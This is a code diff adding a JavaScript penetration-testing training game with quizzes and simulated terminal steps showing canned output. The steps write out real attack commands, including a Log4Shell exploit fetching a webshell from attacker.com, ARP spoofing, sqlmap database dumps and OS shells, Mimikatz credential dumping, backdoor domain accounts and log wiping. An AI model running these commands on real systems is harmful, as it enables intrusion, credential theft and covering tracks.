+        { q: '文件包含漏洞（LFI）可以读取哪个文件来获取系统用户信息？', opts: ['/etc/passwd（Linux）或 /etc/shadow（需要root）','/var/log/syslog','~/.bash_history','/proc/cpuinfo'], ans: 0 },
+        { q: '反序列化漏洞（如Java反序列化）的危害是？', opts: ['构造恶意序列化数据可触发RCE，执行任意代码','导致数据库崩溃','暴露API密钥','影响前端显示'], ans: 0 },
+        { q: '在Web渗透中，获取到低权限Shell后，首先应该做什么？', opts: ['枚举系统信息（OS版本、内核版本、SUID文件）寻找提权路径','立即上传勒索软件','修改系统密码','删除日志文件'], ans: 0 },
+        { q: '缓冲区溢出攻击的核心目标是？', opts: ['覆盖函数的返回地址，让程序跳转到攻击者的shellcode','导致程序崩溃','填满内存','触发异常处理'], ans: 0 },
+        { q: 'Spring4Shell / Log4Shell 等框架漏洞被发现后，攻击者最关注什么？', opts: ['是否有可公开利用的PoC代码，以及目标是否未打补丁','漏洞的CVSS分数','官方修复的时间','受影响用户数量'], ans: 0 },
+        { q: 'Mimikatz工具在内网渗透中主要用途是？', opts: ['从Windows内存（lsass进程）中提取明文密码和NTLM哈希','扫描端口','注入SQL','修改数据库'], ans: 0 },
+        { q: '以下哪种持久化方式最难被普通安全扫描检测？', opts: ['注册表启动项中使用LOL（Living Off the Land）技术调用系统工具','创建新管理员账户','修改hosts文件','在桌面放置恶意脚本'], ans: 0 },
+        { q: 'Kerberoasting攻击的目标是？', opts: ['请求服务票据（TGS）并离线暴力破解服务账户的密码','获取域控制器权限','绕过双因素认证','劫持AD会话'], ans: 0 },
+        { q: '痕迹清除中，以下哪种操作最关键但也最容易被忽视？', opts: ['清除bash历史（history -c + unset HISTFILE）和系统日志中的访问记录','删除上传的文件','修改文件时间戳','重启服务'], ans: 0 }
+    ]
+};
+
+// ===== 模拟实操配置 =====
+var SIM_CONFIGS = {
+    firewall: {
+        title: '🔥 外层防火墙 - 渗透实操',
+        steps: [
+            { label: '① 端口扫描与服务识别', cmd: 'nmap -sS -sV -p 1-65535 --open 192.168.1.1', output: ['Scanning target...', 'PORT   STATE  SERVICE   VERSION', '22/tcp open   ssh       OpenSSH 8.2', '80/tcp open   http      nginx 1.18.0', '443/tcp open  https     nginx 1.18.0', '8080/tcp open http-proxy  HAProxy 2.1', 'Nmap done: 1 IP, 4 open ports'], type: 'ok', gain: 4 },
+            { label: '② 识别防火墙类型和规则', cmd: 'wafw00f https://target.corp.com && hping3 -S -p 80 192.168.1.1', output: ['[*] Testing target: https://target.corp.com', '[+] The site https://target.corp.com is behind a WAF', '[+] Detected: ModSecurity (OWASP Core Rule Set)', '[!] Firewall rules: stateful inspection, ACL whitelist mode', '[*] hping3 result: flags=SA seq=1 ttl=64 id=31337 rtt=1.2ms'], type: 'warn', gain: 4 },
+            { label: '③ 选择绕过方案（代理隧道）', cmd: 'proxychains4 curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 192.168.0.1" http://target.corp.com/admin', output: ['[proxychains] Dynamic chain: 127.0.0.1:9050', '[proxychains] Strict chain: Tor → Socks5 proxy → target', '[!] WAF bypass attempt via header injection...', '[+] Response: 200 OK', '[+] Admin panel accessible! Firewall rule bypassed via trusted IP header'], type: 'ok', gain: 4 },
+            { label: '④ 建立持久化隧道通道', cmd: 'ssh -N -R 8080:localhost:80 user@jump.server.com -o StrictHostKeyChecking=no', output: ['[*] Establishing reverse tunnel through firewall...', '[*] Connection accepted by jump server', '[+] Tunnel established: firewall.corp.com:8080 → attacker:1337', '[+] Persistent tunnel active. C2 channel online.', '[✓] Firewall layer BYPASSED. Tunnel channel secured.'], type: 'ok', gain: 5 }
+        ]
+    },
+    gateway: {
+        title: '🌐 网关节点 - 渗透实操',
+        steps: [
+            { label: '① ARP广播侦察', cmd: 'arp-scan --interface=eth0 --localnet && netdiscover -r 192.168.1.0/24', output: ['[*] ARP broadcast scan initiated...', '192.168.1.1  aa:bb:cc:dd:ee:ff  (Router/Gateway)', '192.168.1.2  11:22:33:44:55:66  (Switch - Cisco)', '192.168.1.10 ff:ee:dd:cc:bb:aa  (Firewall)', '[*] Netdiscover: Found 3 active hosts', '[+] Gateway identified: 192.168.1.1 (Cisco IOS 15.7)'], type: 'info', gain: 4 },
+            { label: '② 路由表和协议分析', cmd: 'ip route show && traceroute 8.8.8.8 && snmpwalk -v2c -c public 192.168.1.1', output: ['[*] Local routing table:', 'default via 192.168.1.1 dev eth0', '192.168.1.0/24 dev eth0  src 192.168.1.100', '[*] Traceroute: 192.168.1.1 → 10.0.0.1 → 203.0.113.1 → 8.8.8.8', '[*] SNMP Walk result:', 'sysDescr: Cisco IOS Software, 3900 Series, Version 15.7', 'ifNumber: 4', '[+] OSPF area 0.0.0.0 detected via SNMP'], type: 'warn', gain: 4 },
+            { label: '③ ARP欺骗实施（中间人）', cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward && arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &', output: ['[*] Enabling IP forwarding...', '[+] IP forwarding enabled', '[*] arpspoof: Starting ARP poisoning...', '[+] Sending ARP reply: 192.168.1.1 is at OUR-MAC to 192.168.1.100', '[+] Sending ARP reply: 192.168.1.100 is at OUR-MAC to 192.168.1.1', '[!] ARP cache poisoned. Traffic now flowing through attacker machine.', '[+] Capturing credentials with ettercap -T -M arp...'], type: 'ok', gain: 4 },
+            { label: '④ 注入恶意路由并持久化', cmd: 'ip route add 10.0.0.0/8 via 192.168.1.200 && quagga -route-inject ospf area0', output: ['[*] Injecting malicious route into routing table...', '[+] Route 10.0.0.0/8 added via rogue next-hop', '[*] OSPF LSA injection: flooding area 0.0.0.0...', '[+] Rogue LSA accepted by 2 OSPF neighbors', '[!] Internal traffic re-routed through attacker gateway', '[✓] Gateway layer COMPROMISED. All internal traffic intercepted.'], type: 'ok', gain: 5 }
+        ]
+    },
+    database: {
+        title: '🗄️ 数据库存 - 渗透实操',
+        steps: [
+            { label: '① 识别数据库类型和版本', cmd: "sqlmap -u 'http://target.corp.com/user?id=1' --dbs --batch --level=5", output: ['[*] Testing connection to target URL...', '[*] testing if GET parameter \'id\' is dynamic...', '[+] GET parameter \'id\' appears to be dynamic', '[*] heuristic (basic) test shows that GET parameter \'id\' might be injectable', '[+] DBMS: MySQL 8.0.27-commercial', '[+] available databases: [4]', '  [*] information_schema', '  [*] core_banking', '  [*] user_accounts', '  [*] audit_log'], type: 'info', gain: 4 },
+            { label: '② 构造注入提取凭据', cmd: "sqlmap -u 'http://target.corp.com/user?id=1' -D user_accounts -T admin --dump --batch", output: ['[*] fetching columns for table admin in database user_accounts', '[+] retrieved: id, username, password_hash, email, role', '[*] fetching entries for table admin...', '[+] Database dump:', 'id=1 | admin | $2b$12$LcAXbZ... | admin@corp.com | SUPERADMIN', 'id=2 | dbuser | $2b$12$9xPkWm... | db@corp.com | DBA', '[!] Password hashes extracted. Starting offline crack with hashcat...'], type: 'warn', gain: 4 },
+            { label: '③ 权限提升（写Shell）', cmd: "sqlmap -u 'http://target.corp.com/user?id=1' --os-shell --batch", output: ['[*] Testing for OS command injection...', '[+] the back-end DBMS is MySQL', '[*] going to use a web backdoor for command prompt', "[+] trying to upload the file stager on '/var/www/html'...", '[+] the remote file "/var/www/html/tmpXxK9aI.php" has been created', '[!] calling OS shell. To quit type \'x\' or \'q\'', 'os-shell> whoami', 'www-data', 'os-shell> id', 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'], type: 'ok', gain: 4 },
+            { label: '④ 数据导出与痕迹清除', cmd: "mysqldump -u dbuser -pCracked123 core_banking > /tmp/dump.sql && shred -vfz -n 3 /tmp/sqlmap_logs", output: ['[*] Dumping database core_banking...', '[+] Dumping table: accounts (12,847 rows)...', '[+] Dumping table: transactions (1,204,331 rows)...', '[+] Dumping table: cards (45,293 rows)...', '[+] Dump saved: /tmp/dump.sql (284 MB)', '[*] Removing sqlmap traces from audit_log...', '[+] 1,204 log entries deleted', '[✓] Database layer EXPLOITED. Full dump acquired. Traces cleared.'], type: 'ok', gain: 5 }
+        ]
+    },
+    appcore: {
+        title: '⚙️ 应用/核心系统 - 渗透实操',
+        steps: [
+            { label: '① 服务枚举与漏洞扫描', cmd: 'nuclei -u https://target.corp.com -t cves/ -t exposures/ -severity critical,high', output: ['[*] nuclei scan started...', '[CVE-2021-44228] [critical] Log4Shell detected on /api/search', '[CVE-2022-22965] [critical] Spring4Shell via /uploadForm endpoint', '[high] Admin panel exposed: /manager/html (Tomcat)', '[high] Outdated Spring Boot 2.3.1 → CVE-2022-22963 RCE', '[!] 4 critical vulnerabilities found. RCE vectors available.'], type: 'warn', gain: 4 },
+            { label: '② 利用RCE漏洞上传Webshell', cmd: 'python3 exploit_log4shell.py --target https://target.corp.com/api/search --cmd "wget http://attacker.com/shell.jsp -O /tmp/shell.jsp"', output: ['[*] Generating JNDI payload: ${jndi:ldap://attacker.com:1389/Exploit}', '[*] Sending crafted request to target...', '[+] JNDI callback received from 203.0.113.100', '[+] Remote code execution triggered!', '[*] Uploading webshell to /opt/tomcat/webapps/ROOT/shell.jsp...', '[+] Webshell uploaded successfully', '[+] Testing webshell: https://target.corp.com/shell.jsp?cmd=id', 'uid=1001(tomcat) gid=1001(tomcat)'], type: 'ok', gain: 4 },
+            { label: '③ 本地提权（LinPEAS扫描）', cmd: 'wget -q https://attacker.com/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | grep -E "SUID|sudo|cron|password"', output: ['[*] Running LinPEAS privilege escalation scanner...', '[!] SUID file found: /usr/bin/pkexec → CVE-2021-4034 (PwnKit)', '[!] Crontab running as root: */5 * * * * /opt/scripts/backup.sh', '[!] World-writable script: /opt/scripts/backup.sh', '[+] Injecting reverse shell into /opt/scripts/backup.sh...', '[!] Waiting for cron execution...', '[+] Root shell received!', 'uid=0(root) gid=0(root) groups=0(root)'], type: 'ok', gain: 4 },
+            { label: '④ 横向移动与持久化', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" && reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution"', output: ['[*] Running Mimikatz for credential dumping...', '[+] NTLM hash: Administrator:aad3b435b51404eeaad3b435b51404ee:8f49412...', '[+] Cleartext: svc_backup → P@ssw0rd2024', '[*] Lateral movement to 192.168.1.50 (Domain Controller)...', '[+] WMI exec on DC: net user backdoor C0r3!2026 /add /domain', '[+] Added to Domain Admins group', '[*] Installing persistence (registry + scheduled task)...', '[✓] Core System PWNED. Domain Admin acquired. Persistence established.'], type: 'ok', gain: 5 }
+        ]
+    }
+};
+
+// ===== 数据存储 =====
+function loadData() {
+    try {
+        var d = localStorage.getItem(STORAGE_KEY);
+        if (d) return JSON.parse(d);
+    } catch(e) {}
+    return {
+        nodes: {
+            firewall: { progress: 0, history: [] },
+            gateway:  { progress: 0, history: [] },
+            database: { progress: 0, history: [] },
+            appcore:  { progress: 0, history: [] }
+        },
+        globalLog: []
+    };
+}
+
+function saveData(data) {
+    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e) {}
+}
+
+// ===== 工具函数 =====
+function shuffleArr(arr) {
+    var a = arr.slice();
+    for (var i = a.length - 1; i > 0; i--) {
+        var j = Math.floor(Math.random() * (i + 1));
+        var t = a[i]; a[i] = a[j]; a[j] = t;
+    }
+    return a;
+}
+
+function getRank(progress) {
+    for (var i = RANKS.length - 1; i >= 0; i--) {
+        if (progress >= RANKS[i].min) return RANKS[i];
+    }
+    return RANKS[0];
+}
+
+function clamp(v, min, max) { return Math.max(min, Math.min(max, v)); }
+
+function now() {
+    var d = new Date();
+    return ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2)+':'+('0'+d.getSeconds()).slice(-2);
+}
+
+function addLog(data, nodeKey, msg, delta) {
+    var nodeName = nodeKey ? (NODES.find(function(n){return n.key===nodeKey;}) || {name:'系统'}).name : '系统';
+    data.globalLog.unshift({
+        ts: now(),
+        node: nodeName,
+        msg: msg,
+        delta: delta
+    });
+    if (data.globalLog.length > 20) data.globalLog.length = 20;
+}
+
+// ===== 渲染 =====
+function renderAll() {
+    var data = loadData();
+    renderDashboard(data);
+    renderNodes(data);
+    renderGlobalLog(data);
+    checkWorldServerUnlock(data);
+}
+
+function renderDashboard(data) {
+    var total = 0;
+    NODES.forEach(function(n) {
+        var p = (data.nodes[n.key] || {}).progress || 0;
+        total += p;
+        var el = document.getElementById('dm-'+n.key);
+        var vl = document.getElementById('dv-'+n.key);
+        if (el) { el.style.width = p + '%'; el.className = 'dash-meter-fill ' + getRank(p).pbar; }
+        if (vl) vl.textContent = p;
+    });
+    var avg = Math.round(total / NODES.length);
+    var el = document.getElementById('overallPct');
+    if (el) el.textContent = avg;
+}
+
+function renderNodes(data) {
+    var grid = document.getElementById('nodesGrid');
+    if (!grid) return;
+    var html = '';
+    NODES.forEach(function(node) {
+        var nd = data.nodes[node.key] || { progress: 0, history: [] };
+        var p = nd.progress || 0;
+        var rank = getRank(p);
+        var isComplete = p >= 100;
+        html += '<div class="node-card' + (isComplete ? ' node-complete' : '') + '">';
+        // 头部
+        html += '<div class="node-header">';
+        html += '<div class="node-icon">' + node.icon + '</div>';
+        html += '<div><div class="node-name">' + node.name + '</div><div class="node-sublabel">' + node.sub + '</div></div>';
+        html += '<div class="node-rank ' + rank.cls + '">' + rank.label + '</div>';
+        html += '</div>';
+        // 进度条
+        html += '<div class="node-progress-area">';
+        html += '<div class="progress-row">';
+        html += '<div class="progress-pct ' + rank.pct + '">' + p + '</div>';
+        html += '<div class="progress-bar-wrap"><div class="progress-bar-fill ' + rank.pbar + '" style="width:' + p + '%"></div></div>';
+        html += '</div>';
+        html += '<div style="font-size:8px;color:#005500;text-align:right">进度 ' + p + ' / 100</div>';
+        html += '</div>';
+        // 按钮
+        html += '<div class="node-btns">';
+        html += '<button class="btn-quiz" onclick="openQuiz(\'' + node.key + '\')">📝 答题挑战</button>';
+        html += '<button class="btn-sim" onclick="openSim(\'' + node.key + '\')">💻 模拟实操</button>';
+        html += '</div>';
+        // 历史
+        html += '<div class="node-history">';
+        var hist = (nd.history || []).slice(0, 3);
+        if (hist.length === 0) {
+            html += '<div class="history-item"><span class="hi-text" style="color:#003300">暂无学习记录</span></div>';
+        } else {
+            hist.forEach(function(h) {
+                var dCls = h.delta >= 0 ? 'pos' : 'neg';
+                var dStr = (h.delta >= 0 ? '+' : '') + h.delta;
+                html += '<div class="history-item"><span class="hi-text">' + h.ts + ' ' + h.type + '</span><span class="hi-delta ' + dCls + '">' + dStr + '</span></div>';
+            });
+        }
+        html += '</div>';
+        html += '</div>';
+    });
+    grid.innerHTML = html;
+}
+
+function renderGlobalLog(data) {
+    var el = document.getElementById('globalLogArea');
+    if (!el) return;
+    var logs = data.globalLog || [];
+    if (logs.length === 0) {
+        el.innerHTML = '<div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-node">系统</span><span class="log-msg">等待学习操作...</span></div>';
+        return;
+    }
+    el.innerHTML = logs.map(function(l) {
+        var dStr = (l.delta !== undefined && l.delta !== null) ? ((l.delta >= 0 ? '+' : '') + l.delta) : '';
+        var dCls = l.delta > 0 ? 'pos' : (l.delta < 0 ? 'neg' : '');
+        return '<div class="log-entry"><span class="log-ts">' + l.ts + '</span><span class="log-node">' + l.node + '</span><span class="log-msg">' + l.msg + '</span>' +
+            (dStr ? '<span class="log-delta ' + dCls + '">' + dStr + '</span>' : '') + '</div>';
+    }).join('');
+}
+
+// ===== 更新进度 =====
+function updateProgress(nodeKey, delta, histType) {
+    var data = loadData();
+    var nd = data.nodes[nodeKey] || { progress: 0, history: [] };
+    var oldP = nd.progress || 0;
+    var newP = clamp(oldP + delta, 0, 100);
+    nd.progress = newP;
+    nd.history = nd.history || [];
+    nd.history.unshift({ ts: now(), type: histType, delta: delta });
+    if (nd.history.length > 20) nd.history.length = 20;
+    data.nodes[nodeKey] = nd;
+    addLog(data, nodeKey, histType + ' ' + (delta >= 0 ? '↑' : '↓') + Math.abs(delta), delta);
+    saveData(data);
+    // 世界服务器回合计数器（每次答题/实操完成 +1）
+    try {
+        var round = parseInt(localStorage.getItem('worldServerRound') || '0', 10);
+        localStorage.setItem('worldServerRound', String(round + 1));
+    } catch(e) {}
+    // 检测世界服务器解锁状态
+    checkWorldServerUnlock(data);
+    return newP;
+}
+
+function checkWorldServerUnlock(data) {
+    var allDone = NODES.every(function(n) {
+        return (data.nodes[n.key] || {}).progress >= 100;
+    });
+    var entry = document.getElementById('worldServerEntry');
+    if (!entry) return;
+    
+    if (allDone) {
+        // 全部100%：解锁
+        entry.style.display = 'block';
+        entry.innerHTML = '<button onclick="enterWorldServer()" style="padding:5px 14px;background:rgba(0,180,255,0.15);border:1px solid rgba(0,180,255,0.6);color:#00d4ff;font-family:\'Courier New\',monospace;font-size:11px;cursor:pointer;border-radius:4px;font-weight:bold;text-shadow:0 0 6px rgba(0,180,255,0.5);">🌐 进入世界服务器</button>';
+    } else {
+        // 未全部100%：显示锁定状态和进度
+        var done = NODES.filter(function(n) {
+            return (data.nodes[n.key] || {}).progress >= 100;
+        }).length;
+        entry.style.display = 'block';
+        entry.innerHTML = '<div style="padding:5px 14px;background:rgba(255,68,68,0.05);border:1px solid rgba(255,68,68,0.2);color:#cc4444;font-family:\'Courier New\',monospace;font-size:9px;border-radius:4px;cursor:not-allowed;">🔒 世界服务器 (' + done + '/4 节点完成)</div>';
+    }
+}
+
+function enterWorldServer() {
+    var w = window.open('world-server.html', '_blank');
+    if (!w) {
+        // 弹窗被拦截，改用 location 跳转
+        alert('⚠ 弹窗被浏览器拦截，将在当前窗口打开世界服务器...');
+        window.location.href = 'world-server.html';
+    }
+}
+
+// ===== 答题系统 =====
+var quizState = {
+    nodeKey: '',
+    questions: [],
+    currentIdx: 0,
+    results: [],   // true/false per question
+    answered: false
+};
+
+function openQuiz(nodeKey) {
+    var pool = QUIZ_BANK[nodeKey] || [];
+    var shuffled = shuffleArr(pool);
+    var picked = shuffled.slice(0, 3);
+    // 对每题的选项进行随机排序（记录正确答案的文本）
+    quizState = {
+        nodeKey: nodeKey,
+        questions: picked.map(function(q) {
+            var opts = q.opts.slice();
+            var correctText = opts[q.ans];
+            var shuffledOpts = shuffleArr(opts);
+            return {
+                q: q.q,
+                opts: shuffledOpts,
+                correctText: correctText
+            };
+        }),
+        currentIdx: 0,
+        results: [],
+        answered: false
+    };
+    var node = NODES.find(function(n){return n.key===nodeKey;}) || {};
+    document.getElementById('quizModalTitle').textContent = '📝 ' + node.name + ' - 答题挑战';
+    document.getElementById('quizModalSub').textContent = '共3题 · 答对+5进度 · 答错-2进度';
+    document.getElementById('quizOverlay').classList.add('active');
+    renderQuizQuestion();
+}
+
+function renderQuizQuestion() {
+    var qs = quizState.questions;
+    var idx = quizState.currentIdx;
+    var el = document.getElementById('quizContent');
+
+    if (idx >= qs.length) {
+        renderQuizSummary();
+        return;
+    }
+
+    var q = qs[idx];
+    var correct = quizState.results.filter(Boolean).length;
+    var wrong = quizState.results.filter(function(r){return !r;}).length;
+
+    var html = '';
+    // 进度点
+    html += '<div class="quiz-progress-bar">';
+    for (var i = 0; i < 3; i++) {
+        var cls = 'qpb-dot';
+        if (i < idx) cls += (quizState.results[i] ? ' done-correct' : ' done-wrong');
+        else if (i === idx) cls += ' current';
+        html += '<div class="' + cls + '"></div>';
+    }
+    html += '</div>';
+
+    html += '<div class="quiz-question">';
+    html += '<div class="quiz-q-num">Q' + (idx+1) + '/3</div>';
+    html += q.q;
+    html += '</div>';
+    html += '<div class="quiz-options">';
+    q.opts.forEach(function(opt, i) {
+        html += '<div class="quiz-option" onclick="answerQuiz(' + i + ')" data-idx="' + i + '">' + opt + '</div>';
+    });
+    html += '</div>';
+    html += '<div class="btn-row"><button class="btn-close" onclick="closeQuiz()">✕ 关闭</button></div>';
+
+    el.innerHTML = html;
+    quizState.answered = false;
+}
+
+function answerQuiz(optIdx) {
+    if (quizState.answered) return;
+    quizState.answered = true;
+    var q = quizState.questions[quizState.currentIdx];
+    var selectedText = q.opts[optIdx];
+    var isCorrect = selectedText === q.correctText;
+    quizState.results.push(isCorrect);
+
+    // 高亮选项
+    var opts = document.querySelectorAll('.quiz-option');
+    for (var i = 0; i < opts.length; i++) {
+        opts[i].classList.add('disabled');
+        if (q.opts[i] === q.correctText) opts[i].classList.add('correct');
+    }
+    if (!isCorrect) opts[optIdx].classList.add('wrong');
+
+    // 反馈提示
+    var feedback = document.createElement('div');
+    feedback.className = 'quiz-feedback ' + (isCorrect ? 'ok' : 'fail');
+    feedback.textContent = isCorrect ? '✓ 正确！+5 进度' : '✗ 答错了，-2 进度。正确答案: ' + q.correctText;
+    var el = document.getElementById('quizContent');
+    var optArea = el.querySelector('.quiz-options');
+    optArea.parentNode.insertBefore(feedback, optArea.nextSibling);
+
+    // 延迟下一题
+    quizState.currentIdx++;
+    setTimeout(function() {
+        renderQuizQuestion();
+    }, isCorrect ? 900 : 1400);
+}
+
+function renderQuizSummary() {
+    var correct = quizState.results.filter(Boolean).length;
+    var wrong = 3 - correct;
+    var delta = correct * 5 - wrong * 2;
+
+    // 应用进度变化
+    var newP = updateProgress(quizState.nodeKey, delta, '答题');
+    renderAll();
+
+    var el = document.getElementById('quizContent');
+    var dCls = delta >= 0 ? 'delta-pos' : 'delta-neg';
+    var dStr = (delta >= 0 ? '+' : '') + delta;
+    var node = NODES.find(function(n){return n.key===quizState.nodeKey;}) || {};
+
+    var html = '<div class="quiz-summary">';
+    html += '<div class="score-big">' + correct + '/3</div>';
+    html += '<div class="score-label">答题完成</div>';
+    html += '<div class="progress-delta ' + dCls + '">' + node.name + ' 进度 ' + dStr + '</div>';
+    html += '<div style="font-size:10px;color:#008800;margin:6px 0">当前进度: ' + newP + '% &nbsp;|&nbsp; ' + getRank(newP).label + '</div>';
+    if (correct === 3) {
+        html += '<div style="font-size:11px;color:#00ff41;margin-top:8px;text-shadow:0 0 6px #00ff41">🎯 全部答对！</div>';
+    } else if (correct === 0) {
+        html += '<div style="font-size:10px;color:#ff6666;margin-top:8px">继续学习，下次会更好！</div>';
+    }
+    html += '</div>';
+    html += '<div class="btn-row"><button class="btn-primary" onclick="openQuiz(\'' + quizState.nodeKey + '\')">🔄 再来一次</button><button class="btn-close" onclick="closeQuiz()">✕ 关闭</button></div>';
+    el.innerHTML = html;
+}
+
+function closeQuiz() {
+    document.getElementById('quizOverlay').classList.remove('active');
+}
+
+// ===== 模拟实操系统 =====
+var simState = {
+    nodeKey: '',
+    steps: [],
+    currentStep: 0,
+    running: false,
+    totalGain: 0
+};
+
+function openSim(nodeKey) {
+    var cfg = SIM_CONFIGS[nodeKey];
+    if (!cfg) return;
+    simState = { nodeKey: nodeKey, steps: cfg.steps, currentStep: 0, running: false, totalGain: 0 };
+    var node = NODES.find(function(n){return n.key===nodeKey;}) || {};
+    document.getElementById('simModalTitle').textContent = cfg.title;
+    document.getElementById('simModalSub').textContent = '按顺序执行4个步骤 · 每步获得进度奖励';
+    document.getElementById('simOverlay').classList.add('active');
+    renderSim();
+}
+
+function renderSim() {
+    var el = document.getElementById('simContent');
+    var cfg = SIM_CONFIGS[simState.nodeKey];
+
+    var html = '<div class="terminal" id="simTerminal">';
+    html += '<div class="term-line term-info">// 模拟渗透终端 v2.1 - EDUCATIONAL USE ONLY</div>';
+    html += '<div class="term-line term-info">// 目标: ' + (NODES.find(function(n){return n.key===simState.nodeKey;})||{}).name + '</div>';
+    html += '<div class="term-line" style="color:#003300">─────────────────────────────────</div>';
+    html += '<div id="termOutput"></div>';
+    html += '<div class="term-cursor" id="termCursor"></div>';
+    html += '</div>';
+
+    html += '<div class="sim-steps" id="simSteps">';
+    simState.steps.forEach(function(step, i) {
+        var isDone = i < simState.currentStep;
+        var isAvail = i === simState.currentStep;
+        var cls = 'sim-step-btn' + (isDone ? ' done' : '');
+        var disabled = !isAvail && !isDone ? 'disabled' : '';
+        var prefix = isDone ? '✅ ' : (isAvail ? '▶ ' : '⬜ ');
+        html += '<button class="' + cls + '" onclick="executeStep(' + i + ')" ' + disabled + '>' + prefix + step.label + (isDone ? ' [+' + step.gain + ' 进度]' : '') + '</button>';
+    });
+    html += '</div>';
+
+    if (simState.currentStep >= simState.steps.length) {
+        html += '<div class="quiz-summary" style="padding-top:5px">';
+        html += '<div style="font-size:11px;color:#00ff41;font-weight:bold">✓ 所有步骤完成！</div>';
+        html += '<div class="progress-delta delta-pos" style="margin-top:4px">+' + simState.totalGain + ' 进度</div>';
+        html += '</div>';
+    }
+
+    html += '<div class="btn-row"><button class="btn-close" onclick="closeSim()">✕ 关闭</button></div>';
+    el.innerHTML = html;
+}
+
+function executeStep(stepIdx) {
+    if (stepIdx !== simState.currentStep || simState.running) return;
+    simState.running = true;
+    var step = simState.steps[stepIdx];
+    var termEl = document.getElementById('termOutput');
+    var cursor = document.getElementById('termCursor');
+
+    // 隐藏按钮
+    var btns = document.querySelectorAll('.sim-step-btn');
+    for (var i = 0; i < btns.length; i++) btns[i].disabled = true;
+    if (cursor) cursor.style.display = 'inline-block';
+
+    // 显示命令
+    var cmdLine = document.createElement('div');
+    cmdLine.className = 'term-line term-cmd';
+    cmdLine.textContent = step.cmd;
+    termEl.appendChild(cmdLine);
+
+    // 打字机效果输出各行
+    var outputLines = step.output;
+    var lineIdx = 0;
+
+    function showNextLine() {
+        if (lineIdx >= outputLines.length) {
+            // 完成
+            if (cursor) cursor.style.display = 'none';
+            simState.currentStep++;
+            simState.totalGain += step.gain;
+            simState.running = false;
+            updateProgress(simState.nodeKey, step.gain, '实操步骤' + (stepIdx + 1));
+            renderAll();
+            renderSim();
+            // 滚动到底部
+            var terminal = document.getElementById('simTerminal');
+            if (terminal) terminal.scrollTop = terminal.scrollHeight;
+            return;
+        }
+        var line = outputLines[lineIdx];
+        var el = document.createElement('div');
+        el.className = 'term-line ' + getTermClass(line, step.type);
+        termEl.appendChild(el);
+
+        // 逐字显示
+        var charIdx = 0;
+        var interval = setInterval(function() {
+            if (charIdx < line.length) {
+                el.textContent = line.substring(0, charIdx + 1);
+                charIdx++;
+            } else {
+                clearInterval(interval);
+                lineIdx++;
+                var terminal = document.getElementById('simTerminal');
+                if (terminal) terminal.scrollTop = terminal.scrollHeight;
+                setTimeout(showNextLine, 80);
+            }
+        }, 18);
+    }
+
+    setTimeout(showNextLine, 300);
+}
+
+function getTermClass(line, type) {
+    if (line.startsWith('[+]') || line.includes('✓') || line.includes('accepted') || line.includes('established')) return 'term-ok';
+    if (line.startsWith('[!]') || line.includes('WARNING') || line.includes('detected')) return 'term-warn';
+    if (line.startsWith('[*]') || line.startsWith('//')) return 'term-info';
+    if (line.startsWith('uid=') || line.includes('PWNED') || line.includes('COMPROMISED') || line.includes('BYPASSED') || line.includes('EXPLOITED')) return 'term-ok';
+    return 'term-out';
+}
+
+function closeSim() {
+    document.getElementById('simOverlay').classList.remove('active');
+}
+
+// ===== 重置 =====
+function confirmReset() {
+    if (confirm('⚠ 确认重置所有学习进度？此操作不可恢复！')) {
+        localStorage.removeItem(STORAGE_KEY);
+        renderAll();
+    }
+}
+
+// ===== 初始化 =====
+renderAll();
+</script>
+</body>
+</html>
